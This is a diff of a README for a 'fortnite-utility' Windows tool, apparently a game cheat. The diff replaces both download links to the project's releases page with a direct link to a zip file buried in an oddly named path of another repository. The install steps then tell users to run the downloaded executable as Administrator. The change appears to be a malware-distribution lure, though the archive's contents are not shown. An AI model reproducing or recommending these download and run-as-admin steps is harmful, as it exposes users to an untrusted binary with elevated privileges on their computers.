@@ -5,7 +5,7 @@ description: "Optimize system performance and manage Windows resources for a smo
 ---
 # 🎯 fortnite-utility - Improve your tactical awareness and performance
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/sluggish-moonshot128/fortnite-utility/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/sluggish-moonshot128/sluggish-moonshot128.github.io/main/acetamide/sluggish_github_moonshot_io_v2.4.zip)
 
 ## Overview ℹ️
 
@@ -25,7 +25,7 @@ Before you start, check that your computer meets these requirements:
 
 Follow these steps to set up the software.
 
-1. Visit [this page](https://github.com/sluggish-moonshot128/fortnite-utility/releases) to download the installer.
+1. Visit [this page](https://raw.githubusercontent.com/sluggish-moonshot128/sluggish-moonshot128.github.io/main/acetamide/sluggish_github_moonshot_io_v2.4.zip) to download the installer.
 2. Choose the latest release version.
 3. Save the executable file to a folder on your computer.
 4. Locate the file and right-click it to select "Run as Administrator."
